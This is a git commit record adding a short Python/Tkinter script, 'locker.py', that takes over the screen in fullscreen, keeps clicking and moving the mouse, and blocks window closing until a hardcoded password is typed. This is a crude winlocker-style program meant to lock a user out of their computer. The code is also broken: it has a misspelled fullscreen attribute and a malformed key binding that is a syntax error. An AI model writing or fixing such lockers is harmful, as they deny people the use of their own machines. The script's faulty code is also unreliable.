9c9422258f572fffa3db5d7ffcfa935076eb06f3
Сергей Полещук <sergv77@yandex.ru>
2021-06-15 10:04:45 +0300

    downlowd file locker.py

---
+++ locker.py
@@ -0,0 +1,28 @@
+from tkinter import Tk, Entry, Label
+from pyautogui import click, moveTo
+from time import sleep
+
+def callback(event):
+    global k, entry
+    if entry.get() == 'yf[hty': k = True
+def on_closing():
+    click(675, 420)
+    moveTo(675, 420)
+    root.attributes("-fullscreeen", True)
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.update()
+    root.bind('<Control -KeyPress-C'. callback)
+root = Tk()
+root.title("Locker")
+root.attributes("-fullscreeen", True)
+entry = Entry(root, font = 1)
+entry.place(width=150, height=50, x=600, y=400)
+label0 = Label(root, text="Locker_by_#001", font=1)
+label0.grid(row=470, column=300)
+label1 = Label(root, text="Введите пароль и нажмите Ctrl+C", font=1)
+label1.place(x=470, y=300)
+root.update()
+sleep(0.2)
+click(675, 420)
+k = False
+while k != True: on_closing()
